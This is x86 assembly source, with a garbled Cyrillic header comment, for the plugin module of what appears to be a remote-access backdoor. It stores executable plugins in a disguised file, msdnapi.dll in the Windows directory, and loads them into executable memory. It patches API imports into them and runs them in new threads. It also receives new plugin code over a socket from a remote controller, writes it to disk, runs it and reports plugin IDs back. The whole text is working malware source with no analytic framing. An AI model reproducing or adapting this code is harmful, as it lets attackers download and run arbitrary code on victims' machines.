   ; Œ®¤ã«ì ®â¢¥ç îé¨© §  ®¡à ¡®âªã ¯« £¨®¢

   LoadPlugins proc
       lea eax,[plugs][ebp]
       push    eax
       Call    [GetWindowsDirectory][ebp],eax,460
       pop edi
       xor eax,eax
   Findz:  scasb
       jnz Findz
       dec edi
       mov eax,'dsm\'
       stosd
       mov eax,'.ipa'
       stosd
       mov eax,'lld'
       stosd

       mov [pnum][ebp],0       ; Number of TCP plugins

       lea edx,[plugs][ebp]
       Call    [CreateFile][ebp],edx,GENERIC_READ,SHARE_READ,0,OPEN_EXISTING,0,0
       inc eax
       jz  NoPlugs
       dec eax
       xchg    eax,ebx
   xLoadPlugins:
       lea eax,[pdata][ebp]
       lea edx,[free][ebp]
       Call    [ReadFile][ebp],ebx,eax,4,edx,0
       mov eax,[free][ebp]
       or  eax,eax
       jz  ClosePlugs
       Call    [VirtualAlloc][ebp],0,[pdata][ebp],MEM_COMMIT,PAGE_EXECUTE_READWRITE
       or  eax,eax
       jz  ClosePlugs
       mov [pofs][ebp],eax
       lea edx,[free][ebp]
       Call    [ReadFile][ebp],ebx,eax,[pdata][ebp],edx,0
       mov eax,[free][ebp]
       cmp eax,[pdata][ebp]
       jnz DeletePlugs
       Call    SetupImport
       mov eax,[pofs][ebp]
       mov edx,[eax][4]
       cmp edx,1
       jz  TcpPlugin
       mov edx,[eax][12]
       add edx,eax
       push    ebx ebp
       lea ebx,[free][ebp]
       Call    [CreateThread][ebp],0,25000,edx,0,0,ebx
       pop ebp ebx
       jmp xLoadPlugins
   TcpPlugin:
       mov eax,[pnum][ebp]
       shl eax,2
       lea edi,[eax][ebp][plugins]
       mov eax,[pofs][ebp]
       stosd
       inc [pnum][ebp]
       jmp xLoadPlugins
   DeletePlugs:
       Call    [CloseHandle][ebp],ebx
       lea eax,[plugs][ebp]
       Call    [DeleteFile][ebp],eax
   ClosePlugs:
       Call    [CloseHandle][ebp],ebx
   NoPlugs:
       ret
   LoadPlugins endp

   pofs    dd  0
   pdata   dd  0

   SetupImport proc
       lea esi,[CreateFile][ebp]
       mov edi,[pofs][ebp]
       add edi,20
       mov ecx,imnum
       cld
   rep movsd
       mov edi,[pofs][ebp]
       add edi,20+imnum*4
       lea esi,[WSAStartup][ebp]
       mov ecx,ixnum
   rep movsd
       ret
   SetupImport endp

   xTcpPlugin  proc        ; EAX - requested code
       mov [xcmd][ebp],eax
       lea esi,[plugins][ebp]
       mov ecx,[pnum][ebp]
       or  ecx,ecx
       jz  Success
   bFindIt:
       push    ebx ebp esi ecx

       mov ecx,[esi]

       mov ebx,[ecx][16]
       cmp ebx,eax
       jnz SkipPlug

       mov ecx,[ecx][12]
       add ecx,[esi]

       mov ebx,[sock2][ebp]
       mov eax,[xcmd][ebp]
       Call    ecx
   SkipPlug:
       pop ecx esi ebp ebx
       or  eax,eax
       jz  Success
       add esi,4
       mov eax,[xcmd][ebp]
       loop    bFindIt
   Success:ret
   xTcpPlugin  endp

   DownloadPlugin  proc
       lea edx,[plugs][ebp]
       Call    [CreateFile][ebp],edx,GENERIC_WRITE,SHARE_READ,0,OPEN_ALWAYS,0,0
       inc eax
       jz  BadPlug
       dec eax
       xchg    eax,ebx
       lea eax,[ex0][ebp]
       Call    [send][ebp],[sock2][ebp],eax,1,0

       Call    [FSeek][ebp],ebx,0,0,2
       lea eax,[dlen][ebp]
       push    eax
       Call    [recv][ebp],[sock2][ebp],eax,4,0
       pop eax
       lea ecx,[free][ebp]
       Call    [WriteFile][ebp],ebx,eax,4,ecx,0
       Call    [VirtualAlloc][ebp],0,[dlen][ebp],MEM_COMMIT,PAGE_EXECUTE_READWRITE
       mov [pofs][ebp],eax
       xchg    eax,edi
   RecvPlugin:
       cmp [dlen][ebp],Block
       jb  WritePart
       Call    [recv][ebp],[sock2][ebp],edi,Block,0
       lea ecx,[free][ebp]
       Call    [WriteFile][ebp],ebx,edi,Block,ecx,0
       add edi,Block
       sub [dlen][ebp],Block
       jmp RecvPlugin
   WritePart:
       Call    [recv][ebp],[sock2][ebp],edi,[dlen][ebp],0
       lea ecx,[free][ebp]
       Call    [WriteFile][ebp],ebx,edi,[dlen][ebp],ecx,0
           Call    [CloseHandle][ebp],ebx

       Call    SetupImport
       mov eax,[pofs][ebp]
       mov edx,[eax][4]
       cmp edx,1
       jz  zTcpPlugin
       mov edx,[eax][12]
       add edx,eax
       push    ebx ebp
       lea ebx,[free][ebp]
       Call    [CreateThread][ebp],0,25000,edx,0,0,ebx
       pop ebp ebx
           jmp     PlugDone
   zTcpPlugin:
       mov eax,[pnum][ebp]
       shl eax,2
       lea edi,[eax][ebp][plugins]
       mov eax,[pofs][ebp]
       stosd
       inc [pnum][ebp]
   PlugDone:
       lea     eax,[okay][ebp]
       Call    [send][ebp],[sock2][ebp],eax,6,0
       ret
   BadPlug:lea eax,[ex1][ebp]
       Call    [send][ebp],[sock2][ebp],eax,1,0
       lea eax,[Err][ebp]
   doCmd:  Call    [send][ebp],[sock2][ebp],eax,6,0
       ret
   DownloadPlugin  endp

   GetTcpPlugs proc
       lea eax,[pnum][ebp]
       Call    [send][ebp],[sock2][ebp],eax,4,0
       lea esi,[plugins][ebp]
       mov ecx,[pnum][ebp]
       or  ecx,ecx
       jz  xNoSend
   GetUids:lodsd
       push    esi ecx
       add eax,16
       Call    [send][ebp],[sock2][ebp],eax,4,0
       pop ecx esi
       loop    GetUids
   xNoSend:ret
   GetTcpPlugs endp

   xcmd    dd  0
